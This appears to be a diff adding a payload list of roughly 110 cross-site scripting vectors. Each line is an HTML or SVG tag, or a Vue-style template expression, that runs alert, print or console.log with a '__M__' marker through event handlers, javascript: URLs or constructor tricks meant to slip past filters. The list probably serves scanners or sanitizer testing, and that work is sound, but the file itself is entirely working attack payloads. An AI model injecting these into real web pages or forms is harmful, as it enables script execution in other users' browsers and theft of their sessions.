@@ -1,0 +1,110 @@
+<a id=x tabindex=1 onfocus=alert('__M__')>
+<a id=x tabindex=1 onfocusin=alert('__M__')>
+<address onscrollsnapchange=alert('__M__') style=overflow-y:hidden;scroll-snap-type:x>
+<animate onbegin=alert('__M__') attributeName=x dur=1s>
+<animate onend=alert('__M__') attributeName=x dur=1s>
+<animate onrepeat=alert('__M__') attributeName=x dur=1s repeatCount=2 />
+<animate xlink:href=#xss attributeName=href from=javascript:alert('__M__') to=1 />
+<animate xlink:href=#xss attributeName=href values=javascript:alert('__M__') />
+<audio autoplay controls onpause=alert('__M__')>
+<audio autoplay controls onseeked=alert('__M__')>
+<audio autoplay controls onseeking=alert('__M__')>
+<audio autoplay controls onvolumechange=alert('__M__')>
+<audio autoplay onloadedmetadata=alert('__M__')>
+<audio autoplay onplay=alert('__M__')>
+<audio autoplay onplaying=alert('__M__')>
+<audio controls autoplay onended=alert('__M__')>
+<audio controls autoplay onratechange=alert('__M__')>
+<audio controls autoplay ontimeupdate=alert('__M__')>
+<audio controls loop muted autoplay onwaiting=alert('__M__')>
+<audio controls ondurationchange=alert('__M__')>
+<audio controls onprogress=alert('__M__')>
+<audio controls onsuspend=alert('__M__')>
+<audio controls onwaiting=alert('__M__')>
+<audio oncanplay=alert('__M__')>
+<audio onloadeddata=alert('__M__')>
+<body onafterprint=alert('__M__')>
+<body onbeforeprint=console.log('__M__')>
+<body onhashchange="print('__M__')">
+<body onmessage=print('__M__')>
+<body onpopstate=print('__M__')>
+<body onresize="print('__M__')">
+<body onscroll=alert('__M__')>
+<body onselectionchange=alert('__M__')>
+<body onselectstart=alert('__M__')>
+<body onunhandledrejection=alert('__M__')>
+<button formaction=javascript:alert('__M__')>
+<component is=script text=alert('__M__')>
+<details ontoggle=alert('__M__') open>
+<dialog open onclose=alert('__M__')>
+<discard onbegin=alert('__M__')>
+<div id=test oncommand=alert('__M__')>
+<div ongesturechange=alert('__M__')>
+<div ongestureend=alert('__M__')>
+<div ongesturestart=alert('__M__')>
+<embed src=1 onerror=alert('__M__') type=image/gif>
+<form action=javascript:alert('__M__')>
+<form onreset=alert('__M__')>
+<form onsubmit=alert('__M__')>
+<iframe onload=alert('__M__')>
+<iframe srcdoc=<script>alert('__M__')</script>>
+<iframe/onload=alert('__M__')>
+<img src @error=e=$event.composedPath().pop().alert('__M__')>
+<img src @error=e=$event.path.pop().alert('__M__')>
+<img src @error=this.alert('__M__')>
+<img src onerror=alert('__M__')>
+<img src=1 onerror=alert('__M__')>
+<img/src onerror=alert('__M__')>
+<img/src/onerror=alert('__M__')>
+<input oninvalid=alert('__M__') required>
+<input type=search onsearch=alert('__M__') value="Hit return" autofocus>
+<input type=submit formaction=javascript:alert('__M__') value=XSS>
+<marquee width=1 loop=1 onbounce=alert('__M__')>
+<marquee width=1 loop=1 onfinish=alert('__M__')>
+<menu type=context id=xss onshow=alert('__M__')>
+<p :=_c.constructor`alert('__M__')`()>
+<p v-=_c.constructor`alert('__M__')`()>
+<p v-show=_createBlock.constructor`alert('__M__')`()>
+<set xlink:href=#x attributeName=href to=javascript:alert('__M__') />
+<slot onslotchange=alert('__M__')>
+<svg@load=this.alert('__M__')>
+<video oncanplaythrough=alert('__M__')>
+<x @click=$event.view.alert('__M__')>
+<x @click=_withCtx.constructor`alert('__M__')`()>
+<x onafterscriptexecute=alert('__M__')>
+<x onbeforescriptexecute=alert('__M__')>
+<xss class="carousel slide" data-ride=carousel data-interval=100 ontransitionend=alert('__M__')>
+<xss contenteditable onbeforeinput=alert('__M__')>
+<xss id=x style="position:absolute;" onanimationcancel="print('__M__')">
+<xss id=x style="transition:color 10s" ontransitioncancel=print('__M__')>
+<xss id=x style="transition:color 1s" ontransitionstart=alert('__M__')>
+<xss id=x style="transition:transform 2s" ontransitionrun=print('__M__')>
+<xss onbeforepaste=alert('__M__')>
+<xss onbeforetoggle=alert('__M__') popover id=x>
+<xss onblur=alert('__M__') id=x tabindex=1 style=display:block>
+<xss oncopy=alert('__M__') value="XSS" autofocus tabindex=1 style=display:block>
+<xss oncut=alert('__M__') value="XSS" autofocus tabindex=1 style=display:block>
+<xss ondragover=alert('__M__') contenteditable style=display:block>
+<xss ondrop=alert('__M__') contenteditable style=display:block>
+<xss onfocusout=alert('__M__') autofocus tabindex=1 style=display:block>
+<xss onload=alert('__M__')>
+<xss onmousewheel=alert('__M__') style=display:block>
+<xss onpointercancel=alert('__M__')>
+<xss onpointerdown=alert('__M__') style=display:block>
+<xss onpointerenter=alert('__M__') style=display:block>
+<xss onpointerleave=alert('__M__') style=display:block>
+<xss onpointermove=alert('__M__') style=display:block>
+<xss onpointerout=alert('__M__') style=display:block>
+<xss onpointerover=alert('__M__') style=display:block>
+<xss onpointerrawupdate=alert('__M__') style=display:block>
+<xss onpointerup=alert('__M__') style=display:block>
+<xss onscrollend=alert('__M__') style="display:block;overflow:auto;border:1px dashed;width:500px;height:100px;">
+<xss onsecuritypolicyviolation=alert('__M__')>
+<xss ontoggle=alert('__M__') popover id=x>
+<xss ontouchcancel=alert('__M__')>
+<xss onwebkitmouseforcechanged=alert('__M__')>
+<xss onwebkitmouseforcedown=alert('__M__')>
+<xss onwebkitmouseforceup=alert('__M__')>
+<xss onwebkitmouseforcewillbegin=alert('__M__')>
+<xss onwebkitwillrevealbottom=alert('__M__')>
+<xss tabindex=1 autofocus onfocusin=alert('__M__')>
